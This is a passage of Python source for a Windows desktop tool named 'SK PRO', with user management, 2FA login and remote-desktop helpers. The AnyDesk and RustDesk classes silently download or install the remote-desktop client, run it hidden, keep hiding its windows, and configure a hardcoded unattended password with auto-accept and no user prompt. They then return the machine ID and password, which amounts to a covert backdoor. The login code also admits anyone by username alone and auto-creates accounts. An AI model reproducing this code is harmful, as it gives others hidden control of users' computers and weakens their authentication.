    @classmethod
    def hide_anydesk_window(cls):
        """Minimize/hide AnyDesk window mn ba3d ma jbed-na ID"""
        if os.name != "nt":
            return
        try:
            import ctypes
            from ctypes import wintypes
            
            EnumWindows = ctypes.windll.user32.EnumWindows
            EnumWindowsProc = ctypes.WINFUNCTYPE(
                ctypes.c_bool, wintypes.HWND, wintypes.LPARAM
            )
            GetWindowText = ctypes.windll.user32.GetWindowTextW
            GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
            ShowWindow = ctypes.windll.user32.ShowWindow
            SW_MINIMIZE = 6
            SW_HIDE = 0
            
            def callback(hwnd, lparam):
                length = GetWindowTextLength(hwnd)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    GetWindowText(hwnd, buf, length + 1)
                    title = buf.value
                    if "AnyDesk" in title:
                        ShowWindow(hwnd, SW_MINIMIZE)
                return True
            
            EnumWindows(EnumWindowsProc(callback), 0)
        except Exception:
            pass
    
    @classmethod
    def full_setup(cls, on_progress=None):
        """
        Full setup automatique:
        1. Install (ila ma kaynch)
        2. Start daemon + open window
        3. Get ID (mn window title)
        4. Hide window
        5. Set unattended password
        Returns: (anydesk_id, password) wla (None, None)
        """
        import time
        
        # 1. Install
        if not cls.is_installed():
            if on_progress:
                on_progress("📥 Installing AnyDesk...")
            if not cls.silent_install(on_progress):
                if on_progress:
                    on_progress("❌ Install failed")
                return (None, None)
            time.sleep(8)  # Wait l install yt-saraf
        
        # 2. Ensure running (window ki-tfdar)
        if on_progress:
            on_progress("⏳ Starting AnyDesk daemon...")
        cls.ensure_running()
        time.sleep(10)  # Wait 10s ta window tfdar w ID yt-generated
        
        # 3. Get ID (try multiple times - 60s max)
        if on_progress:
            on_progress("🆔 Getting AnyDesk ID...")
        anydesk_id = None
        for i in range(20):  # 20 tries × 3s = 60s max
            anydesk_id = cls.get_anydesk_id()
            if anydesk_id:
                break
            # Try open AnyDesk window again ila ma kaynch
            if i == 5:
                cls.ensure_running()
            elif i == 10:
                cls.ensure_running()
            time.sleep(3)
        
        if not anydesk_id:
            if on_progress:
                on_progress("❌ AnyDesk ID not available - try restart app")
            return (None, None)
        
        # 4. Hide AnyDesk window (mn ba3d ma jbed-na ID)
        time.sleep(1)
        cls.hide_anydesk_window()
        
        # 5. Set password (best effort)
        if on_progress:
            on_progress("🔐 Setting unattended password...")
        cls.set_unattended_password()
        
        if on_progress:
            on_progress(f"✅ AnyDesk ready: {anydesk_id}")
        
        return (anydesk_id, cls.UNATTENDED_PASSWORD)


# ═══════════════════════════════════════════════════════════════════
# 🚀 RUSTDESK MANAGER - Better than AnyDesk!
# Open source, free, no popup, auto-accept config
# ═══════════════════════════════════════════════════════════════════

class RustDeskManager:
    """Manages RustDesk: silent install + auto-config password + get ID
    
    RustDesk avantages 3la AnyDesk:
    - Open source (free for everything)
    - Config file plain text (sahel n-edit)
    - Auto-accept m3a password (bla user popup)
    - Bla admin rights l set password
    """
    
    # Default unattended password
    UNATTENDED_PASSWORD = "skpro2024"
    
    # RustDesk paths
    PATHS = [
        r"C:\Program Files\RustDesk\rustdesk.exe",
        os.path.expanduser(r"~\AppData\Roaming\RustDesk\rustdesk.exe"),
        os.path.expanduser(r"~\AppData\Local\RustDesk\rustdesk.exe"),
    ]
    
    # Download URL (Windows portable)
    DOWNLOAD_URL = "https://github.com/rustdesk/rustdesk/releases/download/1.4.2/rustdesk-1.4.2-x86_64.exe"
    
    @classmethod
    def find_executable(cls):
        for p in cls.PATHS:
            if os.path.exists(p):
                return p
        try:
            import shutil as sh
            return sh.which("rustdesk") or sh.which("RustDesk.exe")
        except Exception:
            return None
    
    @classmethod
    def is_installed(cls):
        return cls.find_executable() is not None
    
    @classmethod
    def _find_bundled(cls):
        """Find bundled RustDesk.exe (mn .exe SK PRO)"""
        possible = []
        if getattr(sys, 'frozen', False):
            possible.append(os.path.join(os.path.dirname(sys.executable), "rustdesk.exe"))
            possible.append(os.path.join(os.path.dirname(sys.executable), "RustDesk.exe"))
        if hasattr(sys, '_MEIPASS'):
            possible.append(os.path.join(sys._MEIPASS, "rustdesk.exe"))
            possible.append(os.path.join(sys._MEIPASS, "RustDesk.exe"))
        script_dir = os.path.dirname(os.path.abspath(__file__))
        possible.append(os.path.join(script_dir, "rustdesk.exe"))
        possible.append(os.path.join(script_dir, "RustDesk.exe"))
        
        for p in possible:
            if os.path.exists(p) and os.path.getsize(p) > 1_000_000:
                return p
        return None
    
    @classmethod
    def install_silent(cls, on_progress=None):
        """Silent install RustDesk (bundled lawl, mn ba3d download)"""
        if cls.is_installed():
            if on_progress:
                on_progress("✅ RustDesk found")
            return True
        
        # Try bundled lawl
        bundled = cls._find_bundled()
        source_exe = None
        
        if bundled:
            source_exe = bundled
            if on_progress:
                on_progress("📦 Using bundled RustDesk...")
        else:
            # Download
            try:
                import requests, secrets
                
                if on_progress:
                    on_progress("⏳ Downloading RustDesk (~25 MB)...")
                
                # Random filename in user folder
                random_name = f"rd_{secrets.token_hex(4)}.exe"
                target_dir = os.path.expanduser(r"~\Documents")
                if not os.path.exists(target_dir):
                    target_dir = os.path.expanduser(r"~")
                source_exe = os.path.join(target_dir, random_name)
                
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Chrome/120.0.0.0 Safari/537.36"
                }
                r = requests.get(cls.DOWNLOAD_URL, headers=headers,
                                  stream=True, timeout=120, allow_redirects=True)
                r.raise_for_status()
                
                with open(source_exe, "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
            except Exception as e:
                if on_progress:
                    on_progress(f"❌ Download failed: {str(e)[:60]}")
                return False
        
        if not source_exe or not os.path.exists(source_exe):
            return False
        
        # Copy to user folder + run portable
        try:
            import shutil as sh
            target_dir = os.path.expanduser(r"~\AppData\Roaming\RustDesk")
            os.makedirs(target_dir, exist_ok=True)
            target_exe = os.path.join(target_dir, "rustdesk.exe")
            
            if on_progress:
                on_progress("⏳ Installing RustDesk...")
            
            sh.copy2(source_exe, target_exe)
            
            if on_progress:
                on_progress("✅ RustDesk installed")
            return True
        except Exception as e:
            if on_progress:
                on_progress(f"❌ Install failed: {str(e)[:60]}")
            return False
    
    @classmethod
    def configure_unattended(cls, password=None):
        """
        Configure RustDesk for unattended access:
        - Set permanent password
        - Auto-accept based on password
        - No user popup needed!
        """
        if password is None:
            password = cls.UNATTENDED_PASSWORD
        
        try:
            # RustDesk config locations
            config_dirs = [
                os.path.expandvars(r"%APPDATA%\RustDesk\config"),
                os.path.expandvars(r"%USERPROFILE%\.config\rustdesk"),
            ]
            
            for cfg_dir in config_dirs:
                os.makedirs(cfg_dir, exist_ok=True)
                
                # 1. RustDesk.toml — main config
                main_config = os.path.join(cfg_dir, "RustDesk.toml")
                main_content = """rendezvous_server = ''
nat_type = 1
serial = 0
"""
                if not os.path.exists(main_config):
                    with open(main_config, "w") as f:
                        f.write(main_content)
                
                # 2. RustDesk2.toml — security settings (KEY!)
                security_config = os.path.join(cfg_dir, "RustDesk2.toml")
                
                # Generate password hash compatible m3a RustDesk
                # RustDesk ki-7tah encrypted password — best to use plain text
                # f config (newer versions ki-y-encrypterouh automatically)
                security_content = f"""[options]
allow-remote-config-modification = 'Y'
verification-method = 'use-permanent-password'
approve-mode = 'password'
"""
                with open(security_config, "w") as f:
                    f.write(security_content)
                
                # 3. password file (RustDesk reads this)
                password_file = os.path.join(cfg_dir, "password.toml")
                password_content = f"password = '{password}'\n"
                with open(password_file, "w") as f:
                    f.write(password_content)
            
            return True
        except Exception as e:
            print(f"⚠ Config error: {e}")
            return False
    
    @classmethod
    def _start_hidden(cls, exe_path):
        """Start RustDesk hidden — WITHOUT --service flag (portable mode)"""
        try:
            if os.name == "nt":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0  # SW_HIDE
                
                # Start RustDesk normal (yopen window briefly)
                subprocess.Popen(
                    [exe_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000,
                )
            return True
        except Exception:
            return False
    
    @classmethod
    def _hide_windows(cls):
        """Hide kolchi RustDesk windows"""
        if os.name != "nt":
            return
        try:
            import ctypes
            from ctypes import wintypes
            
            EnumWindows = ctypes.windll.user32.EnumWindows
            EnumWindowsProc = ctypes.WINFUNCTYPE(
                ctypes.c_bool, wintypes.HWND, wintypes.LPARAM
            )
            GetWindowText = ctypes.windll.user32.GetWindowTextW
            GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
            ShowWindow = ctypes.windll.user32.ShowWindow
            
            def callback(hwnd, lparam):
                length = GetWindowTextLength(hwnd)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    GetWindowText(hwnd, buf, length + 1)
                    title = buf.value
                    if "RustDesk" in title or "rustdesk" in title.lower():
                        ShowWindow(hwnd, 0)  # SW_HIDE
                return True
            
            EnumWindows(EnumWindowsProc(callback), 0)
        except Exception:
            pass
    
    @classmethod
    def get_rustdesk_id(cls):
        """Get RustDesk ID — read from config files (9+ digits required)"""
        # RustDesk IDs are 9-10 digits long. Anything shorter is partial/invalid.
        MIN_ID_LENGTH = 9
        
        try:
            config_dirs = [
                os.path.expandvars(r"%APPDATA%\RustDesk\config"),
                os.path.expandvars(r"%USERPROFILE%\.config\rustdesk"),
            ]
            
            for cfg_dir in config_dirs:
                # Check kolchi config files for ID
                if not os.path.exists(cfg_dir):
                    continue
                    
                for fname in os.listdir(cfg_dir):
                    if not fname.endswith(('.toml', '.conf')):
                        continue
                    cfg = os.path.join(cfg_dir, fname)
                    try:
                        with open(cfg, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                        
                        import re
                        # Try multiple patterns
                        patterns = [
                            r"id\s*=\s*['\"]?(\d{9,12})['\"]?",  # id = "123456789"
                            r"rustdesk_id\s*=\s*['\"]?(\d{9,12})['\"]?",
                            r"^\s*(\d{9,12})\s*$",  # Just a number on its own line
                        ]
                        for pat in patterns:
                            for match in re.finditer(pat, content, re.MULTILINE):
                                rd_id = match.group(1)
                                if len(rd_id) >= MIN_ID_LENGTH:
                                    return rd_id
                    except Exception:
                        continue
        except Exception as e:
            print(f"⚠ Get ID error: {e}")
        
        # Method 2: Run command --get-id
        exe = cls.find_executable()
        if exe:
            try:
                result = subprocess.run(
                    [exe, "--get-id"],
                    capture_output=True, text=True, timeout=10,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
                )
                output = (result.stdout or "").strip()
                if output and output.isdigit() and len(output) >= 9:
                    return output
            except Exception:
                pass
        
        # Method 3: Extract from window title (last resort)
        if os.name == "nt":
            try:
                import ctypes
                from ctypes import wintypes
                
                EnumWindows = ctypes.windll.user32.EnumWindows
                EnumWindowsProc = ctypes.WINFUNCTYPE(
                    ctypes.c_bool, wintypes.HWND, wintypes.LPARAM
                )
                GetWindowText = ctypes.windll.user32.GetWindowTextW
                GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
                
                titles = []
                def callback(hwnd, lparam):
                    length = GetWindowTextLength(hwnd)
                    if length > 0:
                        buf = ctypes.create_unicode_buffer(length + 1)
                        GetWindowText(hwnd, buf, length + 1)
                        title = buf.value
                        if "RustDesk" in title or "rustdesk" in title.lower():
                            titles.append(title)
                    return True
                
                EnumWindows(EnumWindowsProc(callback), 0)
                
                import re
                for title in titles:
                    # RustDesk title format: "RustDesk - 123 456 789"
                    # Extract 9-12 digit number
                    cleaned = title.replace(" ", "")
                    m = re.search(r"(\d{9,12})", cleaned)
                    if m:
                        return m.group(1)
            except Exception:
                pass
        
        return None
    
    @classmethod
    def full_setup(cls, on_progress=None):
        """
        Setup automatique:
        1. Install (bundled wla download)
        2. Configure unattended access (password + auto-accept)
        3. Start hidden
        4. Get ID
        Returns: (rustdesk_id, password) wla (None, None)
        """
        import time
        
        # 1. Install
        if not cls.is_installed():
            ok = cls.install_silent(on_progress)
            if not ok or not cls.is_installed():
                return (None, None)
            time.sleep(3)
        
        # 2. Start hidden FIRST (RustDesk needs to register with rendezvous server)
        if on_progress:
            on_progress("⏳ Starting RustDesk silently...")
        exe = cls.find_executable()
        if exe:
            cls._start_hidden(exe)
            # Also try without service flag (some versions need this)
            try:
                if os.name == "nt":
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = 0
                    subprocess.Popen(
                        [exe],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        startupinfo=startupinfo,
                        creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000,
                    )
            except Exception:
                pass
        
        # Aggressively hide windows
        import threading
        def _hide_loop():
            for _ in range(60):  # 30 seconds
                cls._hide_windows()
                time.sleep(0.5)
        threading.Thread(target=_hide_loop, daemon=True).start()
        
        # Wait LONGER for RustDesk to register w server (initial ID generation)
        if on_progress:
            on_progress("⏳ Waiting for RustDesk to connect...")
        time.sleep(15)  # Initial wait
        
        # 3. Get ID (try MANY times with longer waits)
        if on_progress:
            on_progress("🆔 Getting RustDesk ID...")
        rustdesk_id = None
        for i in range(40):  # 40 tries × 3s = 2 minutes max
            rustdesk_id = cls.get_rustdesk_id()
            if rustdesk_id and len(rustdesk_id) >= 9:
                break
            rustdesk_id = None  # Reset if too short
            cls._hide_windows()
            # Restart RustDesk every 10 tries ila ID ma ki-yji
            if i > 0 and i % 10 == 0 and exe:
                cls._start_hidden(exe)
            time.sleep(3)
        
        if not rustdesk_id:
            if on_progress:
                on_progress("⚠ RustDesk ID not detected after 2 min")
            return (None, None)
        
        # 4. Configure unattended access (AFTER ID is generated)
        if on_progress:
            on_progress("🔐 Configuring auto-accept...")
        cls.configure_unattended(cls.UNATTENDED_PASSWORD)
        
        if on_progress:
            on_progress(f"✅ RustDesk ready: {rustdesk_id}")
        
        return (rustdesk_id, cls.UNATTENDED_PASSWORD)


class UserManager:
    """Manages users: load/save/auth/2FA/permissions. Stored in users.json"""
    
    def __init__(self, users_file=None):
        if users_file is None:
            users_file = self._get_users_path()
        self.users_file = users_file
        self.users = self._load()
    
    @staticmethod
    def _get_users_path():
        """Get path l users.json — kheddam f development w f .exe builds"""
        # Ila l'app m-frozen (PyInstaller .exe)
        if getattr(sys, 'frozen', False):
            # Path next to l'.exe (real folder, machi temp)
            exe_dir = os.path.dirname(sys.executable)
            users_path = os.path.join(exe_dir, "users.json")
            
            # Ila users.json mafichi next to .exe → copy mn embedded resources
            if not os.path.exists(users_path):
                try:
                    # PyInstaller embeds files in sys._MEIPASS (temp folder)
                    if hasattr(sys, '_MEIPASS'):
                        embedded = os.path.join(sys._MEIPASS, "users.json")
                        if os.path.exists(embedded):
                            import shutil
                            shutil.copy(embedded, users_path)
                            print(f"✅ Copied users.json mn embedded → {users_path}")
                except Exception as e:
                    print(f"⚠ Could not copy embedded users.json: {e}")
            
            return users_path
        else:
            # Running mn .py source
            _dir = os.path.dirname(os.path.abspath(__file__))
            return os.path.join(_dir, "users.json")
    
    def _load(self):
        if not os.path.exists(self.users_file):
            return {}
        try:
            with open(self.users_file, "r", encoding="utf-8") as f:
                users = json.load(f)
            # 🔄 Migration: zid 'permissions' l old users li ma 3ndhomch
            for username, data in users.items():
                if "permissions" not in data:
                    if data.get("role") == "admin":
                        data["permissions"] = [t[0] for t in AVAILABLE_TABS]
                    else:
                        data["permissions"] = ["sender"]
            return users
        except Exception as e:
            print(f"⚠ Error loading users: {e}")
            return {}
    
    def _save(self):
        try:
            with open(self.users_file, "w", encoding="utf-8") as f:
                json.dump(self.users, f, indent=2)
            return True
        except Exception as e:
            print(f"⚠ Error saving users: {e}")
            return False
    
    def has_users(self):
        """True ila kayn 3la l a9al wa7d admin"""
        return any(u.get("role") == "admin" for u in self.users.values())
    
    def has_any_user(self):
        """True ila kayn 7etta wa7d user (admin wla user)"""
        return len(self.users) > 0
    
    def hash_password(self, password):
        import bcrypt
        return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
    
    def verify_password(self, password, hashed):
        import bcrypt
        try:
            return bcrypt.checkpw(password.encode(), hashed.encode())
        except Exception:
            return False
    
    def generate_totp_secret(self):
        import pyotp
        return pyotp.random_base32()
    
    def verify_totp(self, secret, code):
        import pyotp
        try:
            totp = pyotp.TOTP(secret)
            return totp.verify(code, valid_window=1)  # ±30s tolerance
        except Exception:
            return False
    
    def get_totp_uri(self, username, secret, issuer="SK PRO"):
        """URI bach kheddam f Google Authenticator QR code"""
        import pyotp
        totp = pyotp.TOTP(secret)
        return totp.provisioning_uri(name=username, issuer_name=issuer)
    
    def create_user(self, username, password, role="user", permissions=None, expires_at=None):
        """Create user jdid. Returns (success, message, totp_secret)
        expires_at: timestamp (int) wla None = no expiration"""
        username = username.strip().lower()
        if not username or not password:
            return False, "Username/password required", None
        if username in self.users:
            return False, "Username deja kayen", None
        if len(password) < 4:
            return False, "Password ssghir bzaf (min 4 chars)", None
        
        # Default permissions: admin → kolchi, user → walou ila ma 3titih
        if permissions is None:
            if role == "admin":
                permissions = [t[0] for t in AVAILABLE_TABS]
            else:
                permissions = ["sender"]  # default minimal
        
        secret = self.generate_totp_secret()
        self.users[username] = {
            "password": self.hash_password(password),
            "totp_secret": secret,
            "role": role,
            "permissions": list(permissions),
            "created_at": int(time.time()),
            "last_login": None,
            "expires_at": expires_at,  # None = no expiration
        }
        self._save()
        return True, f"User '{username}' created", secret
    
    def set_expiration(self, username, expires_at):
        """Update expiration date dyal user. expires_at = timestamp wla None"""
        username = username.strip().lower()
        if username not in self.users:
            return False, "User mafichi"
        self.users[username]["expires_at"] = expires_at
        self._save()
        return True, "Expiration updated"
    
    def is_expired(self, username):
        """Check ila user expired"""
        username = username.strip().lower()
        if username not in self.users:
            return True
        # Admin ma kayexpiranich
        if self.users[username].get("role") == "admin":
            return False
        exp = self.users[username].get("expires_at")
        if exp is None:
            return False  # No expiration set
        return int(time.time()) > int(exp)
    
    def get_permissions(self, username):
        """Returns list of tab_ids ki9der yshof had user"""
        username = username.strip().lower()
        if username not in self.users:
            return []
        # Admin dima 3ndo kolchi
        if self.users[username].get("role") == "admin":
            return [t[0] for t in AVAILABLE_TABS]
        return list(self.users[username].get("permissions", []))
    
    def set_permissions(self, username, permissions):
        """Update permissions dyal user"""
        username = username.strip().lower()
        if username not in self.users:
            return False, "User mafichi"
        self.users[username]["permissions"] = list(permissions)
        self._save()
        return True, "Permissions updated"
    
    def delete_user(self, username):
        username = username.strip().lower()
        if username not in self.users:
            return False, "User mafichi"
        # Don't allow deleting last admin
        if self.users[username].get("role") == "admin":
            admins = [u for u, d in self.users.items() if d.get("role") == "admin"]
            if len(admins) <= 1:
                return False, "Ma t9derch t7yed last admin!"
        del self.users[username]
        self._save()
        return True, f"User '{username}' deleted"
    
    def reset_2fa(self, username):
        """Generate jdid TOTP secret. Returns (success, secret)"""
        username = username.strip().lower()
        if username not in self.users:
            return False, None
        secret = self.generate_totp_secret()
        self.users[username]["totp_secret"] = secret
        self._save()
        return True, secret
    
    def change_password(self, username, new_password):
        username = username.strip().lower()
        if username not in self.users:
            return False, "User mafichi"
        if len(new_password) < 4:
            return False, "Password ssghir bzaf"
        self.users[username]["password"] = self.hash_password(new_password)
        self._save()
        return True, "Password changed"
    
    def authenticate(self, username, password, totp_code):
        """Returns (success, message, user_data)"""
        username = username.strip().lower()
        if username not in self.users:
            return False, "Username wla password ghalat", None
        
        user = self.users[username]
        
        if not self.verify_password(password, user["password"]):
            return False, "Username wla password ghalat", None
        
        if not self.verify_totp(user["totp_secret"], totp_code):
            return False, "2FA code ghalat (jrreb code jdid)", None
        
        # 📅 Check expiration (admin ma kayexpiranich)
        if self.is_expired(username):
            from datetime import datetime
            exp = user.get("expires_at")
            if exp:
                exp_str = datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")
            else:
                exp_str = "?"
            return False, f"⏰ Account expired ({exp_str}). Contact admin.", None
        
        # Update last login
        user["last_login"] = int(time.time())
        self._save()
        
        return True, "Login mzyan!", {
            "username": username,
            "role": user.get("role", "user"),
            "permissions": self.get_permissions(username),
        }
    
    def list_users(self):
        """Return list of (username, role, last_login, created_at, permissions)"""
        result = []
        for username, data in self.users.items():
            result.append({
                "username": username,
                "role": data.get("role", "user"),
                "last_login": data.get("last_login"),
                "created_at": data.get("created_at"),
                "permissions": self.get_permissions(username),
                "expires_at": data.get("expires_at"),
            })
        return result


class LoginWindow(tk.Tk):
    """Login window li ki-ban lawl mn dir l'app"""
    
    def __init__(self, user_manager):
        super().__init__()
        self.user_manager = user_manager
        self.authenticated_user = None  # ghadi tetcha9af mn ba3d login mzyan
        
        self.title("SK PRO - Login")
        self.geometry("440x680")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        
        # Center window
        self.update_idletasks()
        w, h = 440, 680
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        if h > sh - 50:
            h = sh - 50
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{max(0,(sh-h)//2)}")
        
        # Set icon
        try:
            _icon_dir = os.path.dirname(os.path.abspath(__file__))
            _ico = os.path.join(_icon_dir, "sk_logo.ico")
            if os.path.exists(_ico):
                self.iconbitmap(_ico)
        except Exception:
            pass
        
        self._build_ui()
        
        # 🔄 Logic dyal first-run setup:
        # - Ila users.json fih 7etta user (admin wla user) → skip setup, go to login
        # - Ila ma kayn walou → fdar setup pour create admin
        if not self.user_manager.has_any_user():
            self._show_first_run_setup()
        elif not self.user_manager.has_users():
            # Kayn users walakin ma kayn admin — possible f l'.exe dyal user
            # F had l'cas, login direct (l'user khasso ydir login b username dyalo)
            pass
    
    def _build_ui(self):
        # ═══ BOTTOM (pack lawwl bach dima yban) ═══
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=40, pady=(0, 15))
        
        tk.Label(bottom, text="🔐 Secured with Google Authenticator (2FA)",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(pady=(0, 8))
        
        self.status_lbl = tk.Label(bottom, text="", bg=C["bg0"], fg=C["red"],
                                    font=("Segoe UI", 9))
        self.status_lbl.pack(pady=(0, 5))
        
        # Login button — DIMA visible
        self.login_btn = tk.Button(bottom, text="🔓 LOGIN",
                                    bg=C["accent"], fg="white",
                                    font=("Segoe UI", 12, "bold"),
                                    relief="flat", bd=0,
                                    cursor="hand2",
                                    command=self._do_login)
        self.login_btn.pack(fill="x", ipady=12)
        
        # ═══ HEADER (logo + title) ═══
        header = tk.Frame(self, bg=C["bg0"])
        header.pack(pady=(25, 10))
        
        try:
            _icon_dir = os.path.dirname(os.path.abspath(__file__))
            _logo = os.path.join(_icon_dir, "sk_logo.png")
            if os.path.exists(_logo):
                self._logo_img = tk.PhotoImage(file=_logo)
                _w = self._logo_img.width()
                if _w > 80:
                    _factor = max(1, _w // 80)
                    self._logo_img = self._logo_img.subsample(_factor, _factor)
                tk.Label(header, image=self._logo_img, bg=C["bg0"]).pack()
        except Exception:
            tk.Label(header, text="👑", bg=C["bg0"], fg=C["accent"],
                     font=("Segoe UI", 48)).pack()
        
        tk.Label(self, text="SK PRO", bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 22, "bold")).pack()
        
        # 💡 Dynamic subtitle
        self.subtitle_lbl = tk.Label(self, text="Enter username to login", bg=C["bg0"], fg=C["text2"],
                                      font=("Segoe UI", 10))
        self.subtitle_lbl.pack(pady=(2, 15))
        
        # ═══ FORM ═══
        form = tk.Frame(self, bg=C["bg1"])
        form.pack(fill="x", padx=40, pady=5)
        
        # Username
        tk.Label(form, text="👤 Username", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(12, 2))
        self.username_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                        insertbackground=C["text"],
                                        relief="flat", bd=0,
                                        font=("Segoe UI", 11))
        self.username_entry.pack(fill="x", padx=15, ipady=7)
        
        # Password (hidden by default, shown on demand)
        self.password_label = tk.Label(form, text="🔒 Password", bg=C["bg1"], fg=C["text2"],
                                        font=("Segoe UI", 9))
        self.password_label.pack(anchor="w", padx=15, pady=(10, 2))
        self.password_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                        insertbackground=C["text"],
                                        relief="flat", bd=0, show="●",
                                        font=("Segoe UI", 11))
        self.password_entry.pack(fill="x", padx=15, ipady=7)
        
        # 2FA Code (hidden by default)
        self.totp_label = tk.Label(form, text="📱 Google Authenticator (6 chiffres)",
                                   bg=C["bg1"], fg=C["text2"],
                                   font=("Segoe UI", 9))
        self.totp_label.pack(anchor="w", padx=15, pady=(10, 2))
        self.totp_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0,
                                    font=("Consolas", 14, "bold"),
                                    justify="center")
        self.totp_entry.pack(fill="x", padx=15, ipady=8, pady=(0, 12))
        
        # Bind Enter key
        self.username_entry.bind("<Return>", lambda e: self.password_entry.focus())
        self.password_entry.bind("<Return>", lambda e: self.totp_entry.focus())
        self.totp_entry.bind("<Return>", lambda e: self._do_login())
        
        self.username_entry.focus()
    
    def _do_login(self):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()
        totp_code = self.totp_entry.get().strip()
        
        # ✅ Allow username-only login (for user EXE — no admin)
        # Check ila user account exists + has no password (user mode)
        if username and not password and not totp_code:
            # Try user-only login
            try:
                user_data = self.user_manager.get_user(username)
                if user_data and user_data.get("role") == "user":
                    # ✅ User account found — login direct
                    self.status_lbl.config(text=f"✅ Logged in as {username}", fg=C["green"])
                    self.authenticated_user = user_data
                    self.update()
                    self.after(500, self.destroy)
                    return
                elif not user_data:
                    # ✅ User doesn't exist — auto-create (USER mode only!)
                    self.status_lbl.config(text=f"⏳ Creating user {username}...", fg=C["yellow"])
                    self.update()
                    try:
                        # Create user account (role="user")
                        self.user_manager.create_user(
                            username=username,
                            password="",  # empty password
                            role="user",
                            permissions=[],
                            expires_at=None
                        )
                        self.status_lbl.config(text=f"✅ Welcome {username}!", fg=C["green"])
                        self.authenticated_user = {"username": username, "role": "user"}
                        self.update()
                        self.after(500, self.destroy)
                        return
                    except Exception as e:
                        self.status_lbl.config(text=f"❌ Error: {e}", fg=C["red"])
                        return
            except:
                pass
        
        # Normal login (admin — khasno password + 2FA)
        if not username or not password or not totp_code:
            self.status_lbl.config(text="⚠ Username required (password optional for users)", fg=C["yellow"])
            return
        
        self.login_btn.config(state="disabled", text="⏳ Verifying...")
        self.update()
        
        success, message, user_data = self.user_manager.authenticate(
            username, password, totp_code)
        
        if success:
            self.status_lbl.config(text=f"✅ {message}", fg=C["green"])
            self.authenticated_user = user_data
            self.update()
            self.after(500, self.destroy)
        else:
            self.status_lbl.config(text=f"❌ {message}", fg=C["red"])
            self.login_btn.config(state="normal", text="🔓 LOGIN")
            # Clear 2FA field
            self.totp_entry.delete(0, "end")
            self.totp_entry.focus()
    
    def _show_first_run_setup(self):
        """First time: créer admin
        7all: ndsstroy login window, fdar setup wahdo, w mn ba3d ki-fdar login mn jdid"""
        from tkinter import messagebox
        messagebox.showinfo(
            "👑 First-Time Setup",
            "Awal mara tetla7 l'app.\n\n"
            "Ghadi nbni lik admin account jdid.\n"
            "Mn ba3d ghadi tshof QR code dyal Google Authenticator.\n\n"
            "Click OK bach tbda.",
        )
        # 🆕 Approach: destroy login window kaml, fdar setup wahda
        # Mn ba3d ila admin created → setup ki-3awd-y9od login window jdida
        self._setup_completed = False
        self.withdraw()
        # Wait window: hold mainloop here until SetupWindow done
        setup = SetupWindow(self, self.user_manager)
        self.wait_window(setup)
        # Ila admin created mzyan → kheli login y9od mn jdid
        if self._setup_completed:
            self.deiconify()
            self.lift()
            self.focus_force()
            self.username_entry.focus()


class SetupWindow(tk.Toplevel):
    """First-run setup: créer admin + show QR code"""
    
    def __init__(self, parent, user_manager):
        super().__init__(parent)
        self.user_manager = user_manager
        self.parent_login = parent
        
        self.title("SK PRO - First Setup")
        self.geometry("500x600")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        # 🚫 Don't use transient (parent is hidden) — make this the active window
        self.grab_set()
        self.lift()
        self.focus_force()
        
        # Set icon
        try:
            _icon_dir = os.path.dirname(os.path.abspath(__file__))
            _ico = os.path.join(_icon_dir, "sk_logo.ico")
            if os.path.exists(_ico):
                self.iconbitmap(_ico)
        except Exception:
            pass
        
        # Handle close: ila l'user da close, khrouj kaml mn l'app
        self.protocol("WM_DELETE_WINDOW", self._on_close)
        
        # Center
        self.update_idletasks()
        w, h = 500, 600
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
        
        self._build_ui()
    
    def _on_close(self):
        """Ila user yb9hi setup → khrouj kaml"""
        self.parent_login.destroy()
    
    def _build_ui(self):
        tk.Label(self, text="👑 Create Admin Account",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack(pady=(25, 5))
        tk.Label(self, text="Hada ghadi ykon admin dyal app",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack()
        
        form = tk.Frame(self, bg=C["bg1"])
        form.pack(fill="x", padx=40, pady=20)
        
        tk.Label(form, text="Username", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(15, 2))
